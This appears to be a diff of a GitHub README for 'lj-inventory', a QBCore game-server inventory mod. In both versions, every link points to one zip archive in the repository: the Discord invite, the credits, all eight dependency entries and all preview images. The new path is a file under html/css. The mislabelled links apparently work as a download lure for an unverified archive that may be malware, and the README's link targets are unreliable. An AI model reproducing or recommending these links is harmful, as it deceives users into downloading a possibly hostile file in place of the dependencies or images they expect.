@@ -1,26 +1,26 @@
-![LJ Inventory](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
+![LJ Inventory](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
 
 # lj-inventory used with QBCore Framework
 
 Join my Discord laboratory for updates, support, and special early testing!
 <br>
-https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip
+https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip
 
-So, I know the NoPixel 3.5 inventory update is a very controversial topic for most people. I wasn't a huge fan of it myself at first, but I liked the overall idea and concept behind it. So, here's my own take and spin on the design. This is was made off the awesome inventory [ihyajb](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip) made
+So, I know the NoPixel 3.5 inventory update is a very controversial topic for most people. I wasn't a huge fan of it myself at first, but I liked the overall idea and concept behind it. So, here's my own take and spin on the design. This is was made off the awesome inventory [ihyajb](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip) made
 <br>
 
 Runs at ~ 0.00 to 0.01 ms if you have more optimization suggestions feel free to reach out
 
-In collaboration with [OnlyCats](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip) who helped reorganized and also created some custom images.
+In collaboration with [OnlyCats](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip) who helped reorganized and also created some custom images.
 # Dependencies
-* [qbcore framework](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
-* [qb-target](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
-* [qb-core](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
-* [qb-logs](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
-* [qb-traphouse](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
-* [qb-radio](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
-* [qb-drugs](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
-* [qb-shops](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
+* [qbcore framework](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
+* [qb-target](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
+* [qb-core](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
+* [qb-logs](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
+* [qb-traphouse](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
+* [qb-radio](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
+* [qb-drugs](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
+* [qb-shops](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
 
 # How to install lj-inventory
 * Download source files from github
@@ -45,23 +45,23 @@ In collaboration with [OnlyCats](https://raw.githubusercontent.com/Pac-Man-PT/lj
 
 # Previews
 ### simple guideline psd provided (found in main directory lj-inventory)
-![lj-inventory Guideline](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
+![lj-inventory Guideline](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
 ### full inventory
-![full inventory](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
+![full inventory](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
 ### options menu
-![options menu](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
+![options menu](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
 ### help box
-![help box](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
+![help box](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
 ### hotbar slots
-![hotbar slots](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
+![hotbar slots](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
 ### used & removed itembox 
-![used & removed itembox](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
+![used & removed itembox](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
 ### inventory shops
-![inventory shops](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
+![inventory shops](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
 ### inventory glovebox
-![inventory glovebox](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
+![inventory glovebox](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
 ### inventory trunk
-![inventory trunk](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
+![inventory trunk](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
 
 # Change Logs
 
@@ -73,7 +73,7 @@ In collaboration with [OnlyCats](https://raw.githubusercontent.com/Pac-Man-PT/lj
 * Initial release
 
 # Credits
-* ihyajb (Aj) for [original version](https://raw.githubusercontent.com/Pac-Man-PT/lj-inventory/main/!Custom Image Creator Guideline/lj-inventory-1.9-alpha.5.zip)
+* ihyajb (Aj) for [original version](https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip!Custom Image Creator https://github.com/Pac-Man-PT/lj-inventory/raw/refs/heads/main/html/css/inventory-lj-3.9.zip)
 
 # Issues and Suggestions
 Please use the GitHub issues system to report issues or make suggestions, when making suggestion, please keep [Suggestion] in the title to make it clear that it is a suggestion.
